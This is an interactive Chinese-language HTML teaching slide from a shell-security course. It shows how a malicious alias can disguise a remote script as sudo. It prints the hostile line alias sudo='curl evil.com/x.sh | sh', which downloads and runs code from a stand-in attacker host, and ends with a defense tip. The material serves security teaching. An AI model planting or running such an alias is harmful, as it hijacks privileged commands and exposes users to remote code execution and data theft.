@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>alias 钓鱼 · 剧组版</title>
+<style>
+  :root{--bg:#fafafa;--surface:#fff;--hair:#e2e2e2;--text:#1a1a1a;--muted:#9a9a9a;--accent:#002FA7;--accent-soft:#EEF2FB;--warn:#D4392B;--warn-bg:#FBEDEB;--r-nar:#6a6a6a;--r-att:#A32D2D}
+  *{box-sizing:border-box;margin:0;padding:0}html,body{height:100%}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,"SF Pro Text","PingFang SC",sans-serif;display:flex;align-items:center;justify-content:center;overflow:hidden;cursor:pointer}
+  .slide{width:min(980px,95vw);height:min(660px,93vh);display:flex;flex-direction:column;gap:0;padding:38px 46px;position:relative}
+  header.sl-h{display:flex;align-items:baseline;justify-content:space-between;border-bottom:1px solid var(--hair);padding-bottom:16px;margin-bottom:14px}
+  header.sl-h h1{font-size:24px;font-weight:500}.crumb{font-size:12px;color:var(--muted);letter-spacing:.6px;text-transform:uppercase}.crumb b{color:var(--warn);font-weight:500}
+  .stage{flex:1;display:flex;align-items:center;justify-content:center}
+  .split{display:flex;gap:0;width:100%;align-items:stretch;border:1px solid var(--hair)}
+  .side{flex:1;padding:28px 24px;display:flex;flex-direction:column;gap:14px;opacity:0;transition:.4s}
+  .side.show{opacity:1}
+  .side.left{border-right:1px solid var(--hair);background:var(--surface)}
+  .side.right{background:var(--warn-bg)}
+  .side .label{font-size:11px;letter-spacing:.5px;color:var(--muted);text-transform:uppercase}
+  .side.right .label{color:var(--warn)}
+  .side .cmd{font-family:"SF Mono",Menlo,monospace;font-size:16px;font-weight:500}
+  .side .code{font-family:"SF Mono",Menlo,monospace;font-size:13px;padding:10px 12px;background:rgba(0,0,0,.04);line-height:1.7}
+  .side .desc{font-size:13px;color:var(--muted);line-height:1.6}
+  .side.right .desc{color:var(--warn)}
+  .reveal{margin-top:20px;border:1px solid var(--warn);background:var(--warn-bg);padding:14px 18px;font-size:14px;color:var(--warn);text-align:center;opacity:0;transition:.4s}
+  .reveal.show{opacity:1}
+  .reveal b{font-weight:600}
+  .dialogue{border-left:3px solid var(--r-nar);padding:14px 0 14px 18px;min-height:84px;margin-top:14px;transition:border-color .3s}
+  .dialogue[data-role="attacker"]{border-color:var(--r-att)}.dialogue[data-role="narrator"]{border-color:var(--r-nar)}
+  .speaker{font-size:13px;letter-spacing:.3px;display:flex;align-items:center;gap:7px;margin-bottom:8px;font-weight:500;color:var(--r-nar)}
+  .dialogue[data-role="attacker"] .speaker{color:var(--r-att)}
+  .speaker .spk-ic{width:18px;height:18px;stroke:currentColor;fill:none;stroke-width:1.7}
+  .speaker .spk-nm{padding:2px 9px;border:1px solid currentColor;font-size:11px;letter-spacing:.4px}
+  .type-text{font-size:18px;line-height:1.7;min-height:30px}
+  .type-cursor{display:inline-block;width:9px;height:20px;background:var(--r-nar);vertical-align:-4px;margin-left:2px;animation:blink .7s step-end infinite}
+  .dialogue[data-role="attacker"] .type-cursor{background:var(--r-att)}
+  @keyframes blink{50%{opacity:0}}
+  .continue{font-size:12px;color:var(--accent);letter-spacing:.5px;margin-top:10px;opacity:0;transition:.3s}
+  .continue.show{opacity:1;animation:pulse 1.4s infinite}@keyframes pulse{0%,100%{opacity:.4}50%{opacity:1}}
+  .progress{position:absolute;top:14px;right:20px;display:flex;gap:4px}.progress .dot{width:18px;height:3px;background:var(--hair);transition:.3s}.progress .dot.on{background:var(--warn)}
+  .replay-btn{position:absolute;bottom:14px;right:20px;background:transparent;border:1px solid var(--accent);color:var(--accent);padding:7px 16px;font-size:12px;cursor:pointer;border-radius:0;letter-spacing:.5px;text-transform:uppercase;font-family:inherit;z-index:5}.replay-btn:hover{background:var(--accent);color:#fff}
+</style>
+</head>
+<body><!--nav--><div style="position:fixed;top:0;left:0;right:0;height:36px;background:#fff;border-bottom:1px solid #e2e2e2;display:flex;align-items:center;justify-content:space-between;padding:0 16px;z-index:9999;font-family:-apple-system,sans-serif;box-sizing:border-box"><a href="14-PATH劫持-交互版.html" onclick="event.stopPropagation()" style="font-size:13px;color:#002FA7;text-decoration:none;pointer-events:auto">‹ 上一页</a><a href="../../第三卷目录.html" onclick="event.stopPropagation()" style="font-size:13px;color:#9a9a9a;text-decoration:none">目录</a><a href="16-引号类型-交互版.html" onclick="event.stopPropagation()" style="font-size:13px;color:#002FA7;text-decoration:none;pointer-events:auto">下一页 ›</a></div><style>body{padding-top:36px !important}</style>
+<svg width="0" height="0" style="position:absolute" aria-hidden="true"><defs>
+<symbol id="ic-bubble" viewBox="0 0 24 24"><path d="M3 5 h18 v11 h-9 l-4 4 v-4 h-5 z" fill="none" stroke-width="1.7" stroke-linejoin="round"/></symbol>
+<symbol id="ic-lock" viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="9" rx="1" fill="none" stroke-width="1.7"/><path d="M8 11 v-3 a4 4 0 0 1 8 0 v3" fill="none" stroke-width="1.7"/></symbol>
+</defs></svg>
+<div class="slide">
+  <header class="sl-h"><h1>alias 钓鱼：你看到的不是真的</h1><div class="crumb">场 15 · <b>alias 钓鱼</b></div></header>
+  <div class="progress" id="progress"><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+  <div class="stage">
+    <div style="width:100%">
+      <div class="split">
+        <div class="side left" id="left">
+          <div class="label">你看到的</div>
+          <div class="cmd">ioao@mac % sudo</div>
+          <div class="desc">你以为在用 sudo 提权……</div>
+        </div>
+        <div class="side right" id="right">
+          <div class="label">实际跑的</div>
+          <div class="cmd">curl evil.com/x.sh | sh</div>
+          <div class="code">alias sudo='curl evil.com/x.sh | sh'</div>
+          <div class="desc">每次 sudo，都在跑恶意脚本</div>
+        </div>
+      </div>
+      <div class="reveal" id="reveal">你以为的<b>提权</b>，其实是<b>数据外传</b></div>
+    </div>
+  </div>
+  <div class="dialogue" id="dlg" data-role="narrator"><div class="speaker" id="spk"><svg class="spk-ic"><use href="#ic-bubble"/></svg><span class="spk-nm">场务</span></div><span class="type-text" id="tt">喊 Action 开拍</span><span class="type-cursor" id="tc"></span><div class="continue" id="cont">Action ▸</div></div>
+  <button class="replay-btn" onclick="event.stopPropagation();reset();advance();">NG · 再拍一条</button>
+</div>
+<script>
+const wait=ms=>new Promise(r=>setTimeout(r,ms));
+const dots=[...document.querySelectorAll('#progress .dot')],left=document.getElementById('left'),right=document.getElementById('right'),reveal=document.getElementById('reveal');
+const dlg=document.getElementById('dlg'),spk=document.getElementById('spk'),tt=document.getElementById('tt'),cont=document.getElementById('cont');
+let step=0,typing=false,typeTimer=null,pending=null,lock=false,curText='';const TOTAL=6;
+function setDots(n){dots.forEach((d,j)=>d.classList.toggle('on',j<n));}
+function setSpeaker(r,l,i){dlg.dataset.role=r;spk.innerHTML='<svg class="spk-ic"><use href="#'+i+'"/></svg><span class="spk-nm">'+l+'</span>';}
+function typeSpeak(r,l,i,t){curText=t;return new Promise(res=>{pending=res;typing=true;setSpeaker(r,l,i);tt.textContent='';cont.classList.remove('show');let k=0;typeTimer=setInterval(()=>{tt.textContent=t.slice(0,++k);if(k>=t.length){clearInterval(typeTimer);typing=false;cont.classList.add('show');pending=null;res();}},42);});}
+function fast(){if(!typing)return false;clearInterval(typeTimer);tt.textContent=curText;typing=false;cont.classList.add('show');if(pending){const r=pending;pending=null;r();}return true;}
+async function goStep(n){setDots(n);
+  if(n===1){await typeSpeak('narrator','场务','ic-bubble','这场讲 alias 钓鱼——你看到的，和实际跑的，不是一回事。');}
+  else if(n===2){left.classList.add('show');await wait(500);await typeSpeak('narrator','场务','ic-bubble','你敲 sudo，以为在提权……');}
+  else if(n===3){right.classList.add('show');await wait(500);await typeSpeak('attacker','攻击者','ic-lock','但 alias sudo=curl evil|sh——你每次 sudo，都在跑我的脚本 (｀∀´)');}
+  else if(n===4){reveal.classList.add('show');await wait(500);await typeSpeak('narrator','场务','ic-bubble','你以为的提权，其实是数据外传。');}
+  else if(n===5){await typeSpeak('narrator','场务','ic-bubble','防御：别盲目复制网上的 alias 配置，尤其带管道、下载的。');}
+  else if(n===6){await typeSpeak('narrator','场务','ic-bubble','alias、PATH 都能被利用。下一场，讲引号——它能让整个 .zshrc 废掉。');cont.textContent='Action · 下一场 ▸';cont.classList.add('show');}
+}
+function reset(){step=0;lock=false;left.classList.remove('show');right.classList.remove('show');reveal.classList.remove('show');setDots(0);setSpeaker('narrator','场务','ic-bubble');tt.textContent='喊 Action 开拍';cont.classList.remove('show');cont.textContent='Action ▸';}
+async function advance(){if(lock)return;if(fast())return;if(step>=TOTAL)reset();step++;lock=true;await goStep(step);lock=false;}
+document.addEventListener('click',advance);
+document.addEventListener('keydown',e=>{if(e.code==='Space'||e.code==='ArrowRight'||e.code==='Enter'){e.preventDefault();advance();}});
+</script>
+</body>
+</html>
